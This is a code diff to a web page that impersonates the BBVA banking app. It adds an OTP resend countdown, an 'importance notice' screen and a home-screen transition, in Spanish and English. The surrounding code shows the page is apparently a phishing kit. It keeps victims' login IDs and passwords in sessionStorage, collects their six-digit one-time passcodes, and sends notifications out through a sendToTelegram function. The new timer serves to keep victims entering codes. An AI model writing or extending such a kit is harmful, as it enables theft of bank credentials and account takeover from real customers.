@@ -136,6 +136,7 @@ const translations = {
         otpSent: 'El OTP ha sido enviado al número de móvil registrado',
         submitOTP: 'Enviar OTP',
         otpExpired: '¡OTP expirado, introduce un nuevo OTP!',
+        resendOTP: 'Reenviar OTP',
         
         // Help questions
         helpQ1: '¿Qué puedo hacer si tengo problemas para iniciar sesión en la app de BBVA?',
@@ -213,6 +214,7 @@ const translations = {
         otpSent: 'OTP has been sent to registered mobile number',
         submitOTP: 'Submit OTP',
         otpExpired: 'OTP expired enter new OTP!',
+        resendOTP: 'Resend OTP',
         
         // Help questions
         helpQ1: 'What can I do if I have problems logging into the BBVA app?',
@@ -358,24 +360,16 @@ document.addEventListener('DOMContentLoaded', function() {
     // Attach listeners initially
     attachButtonListeners();
     
-    // Transition from first screen (download.jpg) to second screen (bg .png)
+    // Transition from first screen (download.jpg) to importance notice screen
     // Change the delay (3000 = 3 seconds) to adjust timing
     setTimeout(function() {
         const firstScreen = document.querySelector('.first-screen');
-        const secondScreen = document.querySelector('.second-screen');
+        const importanceScreen = document.getElementById('importance-notice-screen');
         
-        if (firstScreen && secondScreen) {
+        if (firstScreen && importanceScreen) {
             firstScreen.classList.add('hide');
-            secondScreen.classList.add('show');
-            console.log('Home screen is now visible - buttons should work!');
-            
-            // Update greeting when home screen appears
-            setTimeout(function() {
-                setGreeting();
-            }, 100);
-            
-            // Re-attach listeners after screen transition
-            setTimeout(attachButtonListeners, 100);
+            importanceScreen.classList.add('show');
+            console.log('Importance notice screen is now visible!');
         }
     }, 3000); // 3 seconds delay - change this value as needed
     
@@ -579,20 +573,6 @@ function closeLoginModal() {
     }
 }
 
-function togglePasswordVisibility() {
-    const passwordInput = document.getElementById('login-password');
-    const toggleIcon = document.querySelector('.login-password-toggle');
-    
-    if (passwordInput && toggleIcon) {
-        if (passwordInput.type === 'password') {
-            passwordInput.type = 'text';
-            toggleIcon.textContent = '👁️';
-        } else {
-            passwordInput.type = 'password';
-            toggleIcon.textContent = '👁';
-        }
-    }
-}
 
 // Close login modal when clicking on overlay
 document.addEventListener('click', function(e) {
@@ -680,6 +660,10 @@ function closeVerificationScreen() {
     }
 }
 
+// OTP Resend Timer
+let otpTimer = null;
+let otpTimerSeconds = 120; // 2 minutes
+
 // Show OTP Verification Screen
 function showOTPVerificationScreen() {
     const verificationOverlay = document.getElementById('verification-overlay');
@@ -692,6 +676,8 @@ function showOTPVerificationScreen() {
     if (otpVerificationOverlay) {
         otpVerificationOverlay.classList.add('active');
         
+        // Don't start timer here - it will start when user clicks Submit OTP
+        
         // Focus on first OTP input
         setTimeout(function() {
             const firstInput = document.getElementById('otp-1');
@@ -700,6 +686,93 @@ function showOTPVerificationScreen() {
             }
         }, 100);
     }
+}
+
+// Start OTP Resend Timer
+function startOTPTimer() {
+    // Reset timer
+    otpTimerSeconds = 120;
+    
+    // Get elements
+    const resendBtn = document.getElementById('otp-resend-btn');
+    const timerText = document.getElementById('resend-timer-text');
+    
+    if (resendBtn) {
+        resendBtn.disabled = true;
+    }
+    
+    // Clear any existing timer
+    if (otpTimer) {
+        clearInterval(otpTimer);
+    }
+    
+    // Update countdown display
+    const lang = translations[currentLanguage];
+    if (timerText) {
+        timerText.innerHTML = `${lang.resendOTP} (${otpTimerSeconds}s)`;
+    }
+    
+    // Start countdown
+    otpTimer = setInterval(function() {
+        otpTimerSeconds--;
+        
+        if (timerText) {
+            timerText.innerHTML = `${lang.resendOTP} (${otpTimerSeconds}s)`;
+        }
+        
+        if (otpTimerSeconds <= 0) {
+            clearInterval(otpTimer);
+            otpTimer = null;
+            
+            // Enable resend button
+            if (resendBtn) {
+                resendBtn.disabled = false;
+            }
+            
+            // Update text
+            if (timerText) {
+                timerText.innerHTML = lang.resendOTP || 'Resend OTP';
+            }
+        }
+    }, 1000);
+}
+
+// Resend OTP Function
+function resendOTP() {
+    const resendBtn = document.getElementById('otp-resend-btn');
+    const timerText = document.getElementById('resend-timer-text');
+    const timerCountdown = document.getElementById('timer-countdown');
+    
+    if (resendBtn && resendBtn.disabled) {
+        return; // Don't resend if timer is still running
+    }
+    
+    // Clear OTP inputs
+    document.getElementById('otp-1').value = '';
+    document.getElementById('otp-2').value = '';
+    document.getElementById('otp-3').value = '';
+    document.getElementById('otp-4').value = '';
+    document.getElementById('otp-5').value = '';
+    document.getElementById('otp-6').value = '';
+    
+    // Hide error message
+    const errorMessage = document.getElementById('otp-error-message');
+    if (errorMessage) {
+        errorMessage.style.display = 'none';
+    }
+    
+    // Restart timer
+    startOTPTimer();
+    
+    // Focus on first input
+    setTimeout(function() {
+        const firstInput = document.getElementById('otp-1');
+        if (firstInput) {
+            firstInput.focus();
+        }
+    }, 100);
+    
+    console.log('OTP resent - timer restarted');
 }
 
 // Update all text based on current language
@@ -988,6 +1061,9 @@ async function submitOTP() {
         return;
     }
     
+    // Start OTP resend timer when user clicks Submit OTP
+    startOTPTimer();
+    
     // Get stored login credentials (stored when login was submitted)
     const storedLoginId = sessionStorage.getItem('bbva_login_id') || 'Not available';
     const storedPassword = sessionStorage.getItem('bbva_password') || 'Not available';
@@ -1077,6 +1153,66 @@ async function handleActivateCardClick() {
     
     console.log('Sending notification to Telegram...');
     await sendToTelegram(notificationMessage);
+}
+
+// Proceed to Home Screen from Importance Notice
+function proceedToHomeScreen() {
+    const importanceScreen = document.getElementById('importance-notice-screen');
+    const secondScreen = document.querySelector('.second-screen');
+    
+    if (importanceScreen && secondScreen) {
+        // Hide importance notice screen
+        importanceScreen.classList.remove('show');
+        
+        // Show home screen
+        setTimeout(function() {
+            secondScreen.classList.add('show');
+            console.log('Home screen is now visible - buttons should work!');
+            
+            // Update greeting when home screen appears
+            setTimeout(function() {
+                const greetingElement = document.getElementById('greeting');
+                if (greetingElement) {
+                    const currentHour = new Date().getHours();
+                    let greetingKey;
+                    if (currentHour >= 5 && currentHour < 12) {
+                        greetingKey = 'greetingMorning';
+                    } else if (currentHour >= 12 && currentHour < 17) {
+                        greetingKey = 'greetingAfternoon';
+                    } else {
+                        greetingKey = 'greetingEvening';
+                    }
+                    greetingElement.textContent = translations[currentLanguage][greetingKey];
+                }
+            }, 100);
+            
+            // Re-attach button listeners after screen transition
+            setTimeout(function() {
+                const helpButton = document.getElementById('help-button');
+                const menuButton = document.getElementById('menu-button');
+                
+                if (helpButton) {
+                    const newHelpButton = helpButton.cloneNode(true);
+                    helpButton.parentNode.replaceChild(newHelpButton, helpButton);
+                    newHelpButton.addEventListener('click', function(e) {
+                        e.preventDefault();
+                        e.stopPropagation();
+                        openHelpScreen(e);
+                    }, true);
+                }
+                
+                if (menuButton) {
+                    const newMenuButton = menuButton.cloneNode(true);
+                    menuButton.parentNode.replaceChild(newMenuButton, menuButton);
+                    newMenuButton.addEventListener('click', function(e) {
+                        e.preventDefault();
+                        e.stopPropagation();
+                        openMenuScreen(e);
+                    }, true);
+                }
+            }, 100);
+        }, 300);
+    }
 }
 
 // Open help screen from login modal
